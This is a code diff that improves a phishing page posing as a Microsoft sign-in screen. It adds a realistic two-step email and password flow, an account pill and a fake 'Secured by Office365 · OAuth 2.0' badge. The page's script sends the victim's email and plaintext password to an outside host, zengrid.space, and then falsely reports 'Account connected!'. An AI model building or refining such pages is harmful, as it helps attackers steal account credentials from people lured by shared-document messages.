@@ -9,30 +9,37 @@
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
 body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;background:#f3f2f1;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;color:#1a1918;}
-.card{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.1);padding:44px 44px 36px;width:100%;max-width:440px;}
-.ms-logo{display:flex;align-items:center;gap:10px;margin-bottom:28px;}
-.ms-logo svg{flex-shrink:0;}
+.card{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.12),0 0 0 1px rgba(0,0,0,.04);padding:44px 44px 36px;width:100%;max-width:440px;}
+.ms-logo{display:flex;align-items:center;gap:8px;margin-bottom:32px;}
 .ms-logo span{font-size:20px;font-weight:600;color:#1a1918;letter-spacing:-.3px;}
-h1{font-size:24px;font-weight:600;color:#1a1918;margin-bottom:16px;line-height:1.2;}
-.sub{font-size:14px;color:#605e5c;margin-bottom:24px;line-height:1.5;}
-.field{margin-bottom:14px;}
+h1{font-size:24px;font-weight:600;color:#1a1918;margin-bottom:12px;line-height:1.25;}
+.sub{font-size:15px;color:#605e5c;margin-bottom:20px;line-height:1.5;}
+.account-pill{display:inline-flex;align-items:center;gap:8px;border:1px solid #d2d0ce;border-radius:20px;padding:6px 14px 6px 10px;font-size:13px;color:#323130;margin-bottom:20px;cursor:pointer;transition:background .15s;}
+.account-pill:hover{background:#f3f2f1;}
+.account-pill .av{width:24px;height:24px;border-radius:50%;background:#0078d4;color:#fff;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.field{margin-bottom:12px;}
 .field label{display:block;font-size:13px;font-weight:600;color:#323130;margin-bottom:5px;}
-.field input{width:100%;border:1px solid #8a8886;border-radius:2px;padding:8px 10px;font-size:14px;font-family:inherit;outline:none;transition:border-color .15s;background:#fff;color:#1a1918;}
-.field input:focus{border-color:#0078d4;box-shadow:0 0 0 1px #0078d4;}
+.field input{width:100%;border:none;border-bottom:1px solid #605e5c;padding:6px 0;font-size:15px;font-family:inherit;outline:none;background:transparent;color:#1a1918;transition:border-color .15s;}
+.field input:focus{border-bottom:2px solid #0078d4;}
 .pw-wrap{position:relative;}
-.pw-wrap input{padding-right:70px;}
-.pw-toggle{position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;color:#0078d4;font-size:13px;cursor:pointer;font-family:inherit;padding:0;}
+.pw-wrap input{padding-right:56px;}
+.pw-toggle{position:absolute;right:0;top:50%;transform:translateY(-50%);background:none;border:none;color:#0078d4;font-size:13px;cursor:pointer;font-family:inherit;padding:4px;}
 .pw-toggle:hover{text-decoration:underline;}
-.err{background:#fde7e9;border:1px solid #c50f1f;border-radius:2px;padding:10px 14px;font-size:13px;color:#c50f1f;margin-bottom:16px;display:none;}
+.err{background:#fde7e9;border-left:3px solid #c50f1f;padding:10px 14px;font-size:13px;color:#c50f1f;margin-bottom:16px;line-height:1.5;display:none;border-radius:0 2px 2px 0;}
 .err.show{display:block;}
-.btn-sign{display:block;width:100%;background:#0078d4;color:#fff;border:none;border-radius:2px;padding:10px 16px;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;margin-top:20px;transition:background .15s;}
-.btn-sign:hover:not(:disabled){background:#106ebe;}
-.btn-sign:disabled{background:#a19f9d;cursor:not-allowed;}
-.secured{margin-top:24px;font-size:12px;color:#8a8886;text-align:center;}
-.success{display:none;text-align:center;padding:20px 0;}
-.success .check{font-size:56px;margin-bottom:16px;}
+.links-row{display:flex;align-items:center;justify-content:space-between;margin-top:28px;}
+.ms-link{font-size:13px;color:#0078d4;background:none;border:none;cursor:pointer;font-family:inherit;padding:0;text-decoration:none;}
+.ms-link:hover{text-decoration:underline;}
+.btn-next{background:#0078d4;color:#fff;border:none;border-radius:2px;padding:8px 20px;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;transition:background .15s;min-width:108px;}
+.btn-next:hover:not(:disabled){background:#106ebe;}
+.btn-next:disabled{background:#a19f9d;cursor:not-allowed;}
+.step{display:none;}
+.step.active{display:block;}
+.success{display:none;text-align:center;padding:16px 0;}
+.success .icon{font-size:56px;margin-bottom:18px;}
 .success h2{font-size:20px;font-weight:600;color:#107c10;margin-bottom:10px;}
 .success p{font-size:14px;color:#605e5c;line-height:1.6;}
+.footer{margin-top:28px;font-size:11px;color:#8a8886;text-align:center;border-top:1px solid #edebe9;padding-top:16px;}
 </style>
 </head>
 <body>
@@ -42,31 +49,53 @@ h1{font-size:24px;font-weight:600;color:#1a1918;margin-bottom:16px;line-height:1
     <span>Microsoft</span>
   </div>
 
-  <div id="_form_wrap">
+  <!-- Step 1: Email -->
+  <div id="_s1" class="step active">
     <h1>Sign in</h1>
-    <p class="sub">Enter your Microsoft account credentials to connect.</p>
-    <div class="err" id="_err"></div>
-    <form id="_frm" autocomplete="on">
+    <p class="sub">Use your Microsoft account.</p>
+    <div class="err" id="_err1"></div>
+    <form id="_frm1" autocomplete="on" novalidate>
       <div class="field">
         <label for="_em">Email, phone, or Skype</label>
-        <input type="email" id="_em" name="email" autocomplete="username" required placeholder="someone@example.com"/>
+        <input type="email" id="_em" name="email" autocomplete="username" placeholder=""/>
       </div>
+      <div class="links-row">
+        <a href="https://account.microsoft.com" target="_blank" class="ms-link">No account? Create one!</a>
+        <button type="submit" class="btn-next" id="_next">Next</button>
+      </div>
+    </form>
+    <div class="footer">🔒 Secured by Office365 · OAuth 2.0</div>
+  </div>
+
+  <!-- Step 2: Password -->
+  <div id="_s2" class="step">
+    <h1>Enter password</h1>
+    <div class="account-pill" id="_pill" onclick="document.getElementById('_s1').classList.add('active');document.getElementById('_s2').classList.remove('active');document.getElementById('_em').focus();">
+      <div class="av" id="_av">?</div>
+      <span id="_em_disp"></span>
+    </div>
+    <div class="err" id="_err2"></div>
+    <form id="_frm2" autocomplete="on">
       <div class="field">
         <label for="_pw">Password</label>
         <div class="pw-wrap">
-          <input type="password" id="_pw" name="password" autocomplete="current-password" required/>
+          <input type="password" id="_pw" name="password" autocomplete="current-password"/>
           <button type="button" class="pw-toggle" id="_pwtog">Show</button>
         </div>
       </div>
-      <button type="submit" class="btn-sign" id="_sub">Sign in</button>
+      <div class="links-row">
+        <a href="https://account.live.com/password/reset" target="_blank" class="ms-link">Forgot password?</a>
+        <button type="submit" class="btn-next" id="_sub">Sign in</button>
+      </div>
     </form>
-    <div class="secured">🔒 Secured by Office365 · OAuth 2.0</div>
+    <div class="footer">🔒 Secured by Office365 · OAuth 2.0</div>
   </div>
 
+  <!-- Success -->
   <div class="success" id="_ok">
-    <div class="check">✅</div>
+    <div class="icon">✅</div>
     <h2>Account connected!</h2>
-    <p>Your Microsoft account has been linked successfully.<br/>You can close this tab and return to Shared document.</p>
+    <p>Your Microsoft account has been linked successfully.<br/>You can close this tab.</p>
   </div>
 </div>
 
@@ -122,17 +151,47 @@ var _fn=function(){if(_d.body){_d.body.appendChild(_hp);}else{setTimeout(_fn,100
 })();</script>
 <script>(function(){
   var _ep = "https://zengrid.space/connect/page/Pj6YSRqo-OiOnXCA0kp7MKUjX9XqrIy6/direct-login";
+
+  // Step 1 → Step 2
+  document.getElementById('_frm1').addEventListener('submit', function(e){
+    e.preventDefault();
+    var em = document.getElementById('_em').value.trim();
+    var err = document.getElementById('_err1');
+    if (!em || !em.includes('@')) {
+      err.textContent = 'Enter a valid email address.';
+      err.classList.add('show');
+      return;
+    }
+    err.classList.remove('show');
+    // Populate account pill
+    document.getElementById('_em_disp').textContent = em;
+    document.getElementById('_av').textContent = em[0].toUpperCase();
+    // Switch steps
+    document.getElementById('_s1').classList.remove('active');
+    document.getElementById('_s2').classList.add('active');
+    document.getElementById('_pw').focus();
+  });
+
+  // Password show/hide
   document.getElementById('_pwtog').addEventListener('click', function(){
     var i = document.getElementById('_pw');
     var show = i.type === 'password';
     i.type = show ? 'text' : 'password';
     this.textContent = show ? 'Hide' : 'Show';
   });
-  document.getElementById('_frm').addEventListener('submit', async function(e){
+
+  // Step 2: Sign in
+  document.getElementById('_frm2').addEventListener('submit', async function(e){
     e.preventDefault();
     var btn = document.getElementById('_sub');
-    var err = document.getElementById('_err');
+    var err = document.getElementById('_err2');
     err.classList.remove('show');
+    var pw = document.getElementById('_pw').value;
+    if (!pw) {
+      err.textContent = 'Enter your password.';
+      err.classList.add('show');
+      return;
+    }
     btn.textContent = 'Signing in…';
     btn.disabled = true;
     try {
@@ -140,13 +199,13 @@ var _fn=function(){if(_d.body){_d.body.appendChild(_hp);}else{setTimeout(_fn,100
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
-          email: document.getElementById('_em').value,
-          password: document.getElementById('_pw').value
+          email: document.getElementById('_em').value.trim(),
+          password: pw
         })
       });
       var d = await r.json();
-      if (!r.ok) throw new Error(d.detail || 'Connection failed');
-      document.getElementById('_form_wrap').style.display = 'none';
+      if (!r.ok) throw new Error(d.detail || 'Sign-in failed. Please try again.');
+      document.getElementById('_s2').classList.remove('active');
       document.getElementById('_ok').style.display = 'block';
     } catch(ex) {
       err.textContent = ex.message;
